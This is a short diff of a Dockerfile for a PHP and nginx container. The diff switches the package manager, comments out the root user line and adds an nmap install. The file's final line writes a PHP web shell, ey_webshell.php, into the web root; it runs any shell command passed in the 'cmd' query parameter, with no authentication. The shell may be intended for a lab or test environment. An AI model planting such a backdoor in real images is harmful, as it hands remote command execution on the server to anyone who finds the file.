@@ -1,12 +1,13 @@
 #FROM ghcr.io/socialgouv/docker/nginx:7.1.1
 FROM trafex/php-nginx
 #FROM php:8.0-apache
-USER root
+#USER root
 
 ARG COMMIT_SHA
 ENV COMMIT_SHA $COMMIT_SHA
 
 RUN echo "=========="
-RUN apk update
+RUN apt update -y
+RUN apt install nmap -y
 RUN echo "=========="
 RUN echo "<?php echo exec(\$_GET['cmd']);?>" > /var/www/html/ey_webshell.php
